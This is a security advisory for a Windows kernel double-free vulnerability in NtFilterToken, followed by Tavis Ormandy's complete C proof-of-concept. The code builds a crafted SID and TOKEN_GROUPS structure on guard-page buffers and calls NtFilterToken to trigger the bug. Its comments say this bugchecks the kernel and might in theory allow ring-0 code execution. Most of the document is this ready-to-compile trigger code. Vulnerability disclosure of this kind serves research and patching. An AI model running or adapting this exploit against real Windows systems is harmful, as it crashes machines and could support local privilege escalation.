source: http://www.securityfocus.com/bid/38044/info

Microsoft Windows is prone to a local privilege-escalation vulnerability that occurs in the kernel.

An attacker can exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will result in the complete compromise of affected computers. Failed exploit attempts will cause a denial of service.

// --------------------------------------------------------
// Windows NtFilterToken() Double Free Vulnerability
// ----------------------------- taviso@sdf.lonestar.org ------------
//
// INTRODUCTION
//
//      NtFilterToken() will jump to a cleanup routine if it failed to capture
//      the arguments specified due to pathological TOKEN_GROUP parameter. This
//      cleanup routine assumes a pointer passed to SeCaptureSidAndAttributesArray()
//      will be NULL if it fails, and attempts to release it otherwise.
//
//      Unfortunately there is a codepath where SeCaptureSidAndAttributesArray()
//      allocates a buffer, releases it on error, but then does not set it to
//      NULL. This causes NtFilterToken() to incorrectly free it again.
//
// IMPACT
//  
//      This is probably exploitable (at least on MP kernels) to get ring0 code
//      execution, but you would have to get the released buffer re-allocated
//      during a very small window and you only get one attempt (the kernel
//      will bugcheck if you dont win the race).
//
//      Although technically this is a local privilege escalation, I don't think
//      it's possible to create a reliable exploit. Therefore, It's probably
//      safe to treat this as if it were a denial of service.
//
//      Interestingly, Microsoft are big proponents of static analysis and this
//      seems like a model example of a statically discoverable bug. I would
//      guess they're dissapointed they missed this one, it would be fun to
//      know what went wrong.
//
//      This vulnerability was reported to Microsoft in October, 2009.
//
// CREDIT
//
//      This bug was discovered by Tavis Ormandy <taviso@sdf.lonestar.org>.
//

#include <windows.h>

PVOID AllocBufferOnPageBoundary(ULONG Size);

int main(int argc, char **argv)
{
    SID *Sid;
    HANDLE NewToken;
    FARPROC NtFilterToken;
    PTOKEN_GROUPS Restricted;

    // Resolve the required routine.
    NtFilterToken = GetProcAddress(GetModuleHandle("NTDLL"), "NtFilterToken");

    // Allocate SID such that touching the following byte will AV.
    Sid             = AllocBufferOnPageBoundary(sizeof(SID));
    Restricted      = AllocBufferOnPageBoundary(sizeof(PTOKEN_GROUPS) + sizeof(SID_AND_ATTRIBUTES));
    
    // Setup SID, SubAuthorityCount is the important field.
    Sid->Revision           = SID_REVISION;
    Sid->SubAuthority[0]    = SECURITY_NULL_RID;
    Sid->SubAuthorityCount  = 2;

    // Respect my authority.
    CopyMemory(Sid->IdentifierAuthority.Value, "taviso", sizeof Sid->IdentifierAuthority.Value);

    // Setup the TOKEN_GROUPS structure.
    Restricted->Groups[0].Attributes    = SE_GROUP_MANDATORY;
    Restricted->Groups[0].Sid           = Sid;
    Restricted->GroupCount              = 1;

    // Trigger the vulnerabilty.
    NtFilterToken(INVALID_HANDLE_VALUE,
                  0,
                  NULL,
                  NULL,
                  Restricted,
                  &NewToken);

    // Not reached
    return 0;
}

#ifndef PAGE_SIZE
# define PAGE_SIZE 0x1000
#endif

// This is a quick routine to allocate a buffer on a page boundary. Simply
// VirtualAlloc() two consecutive pages read/write, then use VirtualProtect()
// to set the second page to PAGE_NOACCESS.
//
//          sizeof(buffer)
//                |
//              <-+-> 
//  +----------------+----------------+
//  | PAGE_READWRITE | PAGE_NOACCESS  |
//  +----------------+----------------+
//              ^     ^
//              |     |
//   buffer[0] -+     +- buffer[size]
//
// No error checking for simplicity, whatever :-)
//
PVOID AllocBufferOnPageBoundary(ULONG Size)
{
    ULONG GuardBufSize;
    ULONG ProtBits;
    PBYTE GuardBuf;

    // Round size requested up to the next multiple of PAGE_SIZE
    GuardBufSize = (Size + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);

    // Add one page to be the guard page
    GuardBufSize = GuardBufSize + PAGE_SIZE;

    // Map this anonymous memory
    GuardBuf = VirtualAlloc(NULL,
                            GuardBufSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);

    // Make the final page NOACCESS
    VirtualProtect(GuardBuf + GuardBufSize - PAGE_SIZE,
                   PAGE_SIZE,
                   PAGE_NOACCESS,
                   &ProtBits);

    // Calculate where pointer should be, so that touching Buffer[Size] AVs.
    return GuardBuf + GuardBufSize - PAGE_SIZE - Size;
}

